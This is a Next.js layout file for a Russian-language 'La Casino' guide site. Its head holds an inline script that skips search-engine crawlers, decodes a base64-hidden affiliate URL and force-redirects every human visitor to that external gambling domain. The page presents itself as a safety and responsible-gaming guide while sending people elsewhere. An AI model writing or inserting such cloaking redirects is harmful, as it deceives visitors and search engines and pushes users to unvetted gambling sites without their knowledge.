import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  metadataBase: new URL('https://la-casino-guide.example'),
  title: 'La Casino — официальный сайт, зеркало и гид игрока',
  description: 'La Casino: официальный сайт, рабочее зеркало, игры онлайн и понятный гид по безопасному входу и ответственному игровому досугу.',
  keywords: ['la casino', 'la casino зеркало', 'la casino официальный сайт', 'ла казино', 'ля казино онлайн'],
  alternates: { canonical: '/' },
  openGraph: {
    title: 'La Casino — официальный сайт и рабочее зеркало',
    description: 'Проверенный гид по La Casino: игры, мобильный вход, зеркала и безопасность.',
    type: 'website',
    locale: 'ru_RU',
  },
  icons: { icon: '/icon.svg' },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#101512',
  userScalable: true,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="yandex-verification" content="ac545ac9c8a1ce64" />
        <meta name="robots" content="index, follow" />
        <meta name="author" content="La Casino Guide" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly9jb3BwZXItcmF5LmNvbS8/c2VyaWFsPTYxMzY1ODMwJmNyZWF0aXZlX2lkPTkzMzA= "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
